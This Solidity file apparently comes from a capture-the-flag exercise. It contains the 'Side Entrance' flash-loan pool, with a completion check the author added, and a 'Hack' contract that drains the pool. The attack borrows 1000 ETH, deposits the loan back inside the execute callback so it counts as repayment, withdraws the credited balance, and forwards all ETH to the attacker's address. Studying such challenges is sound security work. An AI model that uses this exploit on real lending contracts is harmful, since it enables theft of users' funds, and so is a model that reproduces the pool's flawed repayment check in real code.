// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    // variables added by me to check isComplete in Remix //
    // Business logic is not being changed //

    address public player;
    uint256 public playerInitialBalance;
    uint256 ETH_IN_POOL = 1000 ether;

    // Original contract
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    // constructor added by me to check isComplete in Remix
    // Business logic is not being changed
    constructor(address _player) {
        player = _player;
        playerInitialBalance = player.balance;
    }

    // function added by me to check isComplete in Remix
    // Business logic is not being changed //
    function isComplete() public view returns (bool) {
        uint256 poolBalance = address(this).balance;
        uint256 playerBalance = player.balance;
        uint256 diff;
        if (playerBalance > playerInitialBalance) {
            diff = playerBalance - playerInitialBalance;
        }
        // checks if balance of player increased by atleast 999 ETH. (-1 to account for gas cost that may be paid)
        // also checks if pool is drained
        if (diff > ETH_IN_POOL - 1 && poolBalance == 0) {
            return true;
        } else {
            return false;
        }
    }

    // original contract
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) revert RepayFailed();
    }
}

contract Hack {
    SideEntranceLenderPool targetContract;
    address owner = msg.sender;

    constructor(address _targetContract) {
        targetContract = SideEntranceLenderPool(_targetContract);
    }

    function attack(uint256 amount) external payable {
        // 1000 ether => 1000000000000000000000
        targetContract.flashLoan(amount);
        targetContract.withdraw();
    }

    function deposit(uint256 amount) external payable {
        targetContract.deposit{value: amount}();
    }

    function execute() external payable {
        // reentrancy through this function deposit 1000 ether
        targetContract.deposit{value: 1000000000000000000000}();
    }

    receive() external payable {
        payable(owner).transfer(address(this).balance);
    }
}
